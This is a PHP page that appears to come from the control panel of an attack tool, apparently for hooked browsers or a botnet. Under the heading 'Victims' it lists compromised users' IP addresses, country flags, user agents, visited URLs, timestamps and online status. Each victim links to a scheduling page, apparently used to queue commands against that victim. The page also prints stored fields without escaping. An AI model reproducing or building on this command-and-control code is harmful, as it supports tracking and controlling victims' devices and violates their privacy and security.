<?php
include('login.php');
define('allowed',true);
include('../db.php');
include('header.php');
?>
    <div class="content">
        <p>
            <h1>Victims</h1>
        </p>
        <table>
            <tr>
                <th>User ID (<a href="#" ctitle="Identify a user in a site" class="tooltip">?</a>)</th>
                <th>IP Address</th>
                <th>Country</th>
                <th>User Agent</th>
                <th>URL</th>
                <th>Registration Date</th>
                <th>Last Update</th>
                <th>Status</th>
            </tr>
            <?php
            $condition = "WHERE status=1 "; if ($_GET['o'] == "all") $condition = "";
            if ($res = $mysqli->query("SELECT * FROM users ".$condition."ORDER BY lastupdate DESC;")) {
                $res->data_seek(0);
                while ($row = $res->fetch_assoc()) {
                ?>
                <tr>
                    <td><a href="schedules.php?uid=<?php echo $row['id']; ?>"><?php echo $row['id']; ?></a></td>
                    <td><?php echo $row['ip']; ?></td>
                    <td><img width="25" height="15" src="<?php echo "http://api.hostip.info/flag.php?ip=".$row['ip']; ?>" /></td>
                    <td><?php echo $row['ua']; ?></td>
                    <td><?php echo $row['url']; ?></td>
                    <td><?php echo $row['regdate']; ?></td>
                    <td><?php echo $row['lastupdate']; ?></td>
                    <td style="text-align:center">
                        <svg xmlns="http://www.w3.org/2000/svg" style="width:10px;height:10px;">
                            <circle cx="5" cy="5" r="5" stroke="black" stroke-width="1" fill="<?php echo ($row['status'] ? "#00BB00" : "#555555"); ?>" />
                        </svg>
                    </td>
                </tr>
                <?php
                }
                $res->close();
            }
            ?>
        </table>
        <p>
            <input type="button" value="Show all" onclick="document.location.href='?o=all'" />
        </p>
   </div>
</body>
</html>
<?php
$mysqli->close();
?>
